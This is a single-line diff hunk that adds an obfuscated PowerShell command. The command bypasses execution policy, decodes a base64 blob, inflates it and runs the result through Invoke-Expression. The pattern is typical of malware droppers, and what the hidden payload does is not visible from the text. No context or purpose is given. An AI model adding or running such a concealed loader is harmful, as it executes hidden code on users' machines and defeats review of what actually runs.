@@ -1,0 +1,1 @@
+powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('Cy/KLElVUHfOz0svSiwpzUksyczPK1ZUBwA='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
